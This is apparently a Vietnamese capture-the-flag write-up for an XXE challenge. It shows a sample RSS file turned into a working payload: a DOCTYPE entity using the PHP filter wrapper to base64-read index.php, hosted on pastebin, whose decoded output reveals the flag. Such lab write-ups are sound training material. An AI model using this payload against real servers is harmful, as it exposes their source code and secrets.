Lỗ hổng XXE rất giống với lỗ hổng LFI,RFI chúng ta từng làm ở những challenge trước, đều có khả năng include file để thực thi(tham khảo [video](https://www.youtube.com/watch?v=gjm6VHZa_8s) này). Với hint như vậy ta nghĩ ngay đến việc input link 1 đoạn code XML trên `pastebin` . Tạo 1 xml form theo mẫu của w3school:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0">

<channel>
  <title>W3Schools Home Page</title>
  <link>https://www.w3schools.com</link>
  <description>Free web building tutorials</description>
  <item>
    <title>RSS Tutorial</title>
    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
    <description>New RSS tutorial on W3Schools</description>
  </item>
  <item>
    <title>XML Tutorial</title>
    <link>https://www.w3schools.com/xml</link>
    <description>New XML tutorial on W3Schools</description>
  </item>
</channel>

</rss> 
```

thử với những payloads lấy trên [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#php-wrapper-inside-xxe), thì có `PHP Wrapper inside XXE` hoạt động. Sửa lại code như sau(thêm dòng DOCTYPE và biến &xxe):

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<rss version="2.0">

<channel>
  <title>W3Schools Home Page</title>
  <link>https://www.w3schools.com</link>
  <description>Free web building tutorials</description>
  <item>
    <title>RSS Tutorial &xxe;</title>
    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
    <description>New RSS tutorial on W3Schools</description>
  </item>
  <item>
    <title>XML Tutorial</title>
    <link>https://www.w3schools.com/xml</link>
    <description>New XML tutorial on W3Schools</description>
  </item>
</channel>

</rss>
```

Tạo 1 pastebin rồi input link đến nó, gửi form, website trả về 1 đoạn code đã được base64-encode. Decode nó ra sẽ đọc được flag